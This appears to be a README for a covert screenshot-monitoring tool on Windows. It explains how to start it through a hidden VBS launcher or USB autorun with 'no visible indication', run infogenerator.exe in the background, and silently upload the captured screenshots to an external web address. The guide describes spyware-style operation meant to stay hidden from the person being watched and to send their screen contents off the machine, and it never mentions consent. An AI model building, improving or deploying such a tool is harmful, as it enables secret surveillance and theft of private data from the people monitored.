# Silent Background Operation

## 🔇 **Completely Silent Mode**

**Double-click**: `start-monitoring-hidden.vbs`
- ✅ **No terminal windows**
- ✅ **Runs completely in background**
- ✅ **No visible indication** (except in Task Manager)
- ✅ **Auto-starts screenshot capture**

## 🛑 **To Stop Monitoring**

**Double-click**: `stop-monitoring.bat`
- ✅ **Stops all sessions silently**
- ✅ **Kills background processes**

## 📀 **USB Autorun (Optional)**

If you put this on a USB drive:
- ✅ **Autorun.inf** will start monitoring when USB is inserted
- ✅ **Completely silent operation**
- ✅ **Remove USB to stop** (or use stop-monitoring.bat)

## 🎯 **How It Works**

1. `start-monitoring-hidden.vbs` - VBS script runs .bat file silently
2. `start-silent.bat` - Starts infogenerator.exe in background
3. No command windows, no user interaction needed
4. Screenshots upload silently to: https://infogenerator.vercel.app

## 📂 **Files for Silent Operation**

- `start-monitoring-hidden.vbs` ← **Use this for silent start**
- `stop-monitoring.bat` ← **Use this to stop**
- `autorun.inf` ← **For USB autorun**
- `start-monitoring.bat` ← **Visible mode (for debugging)**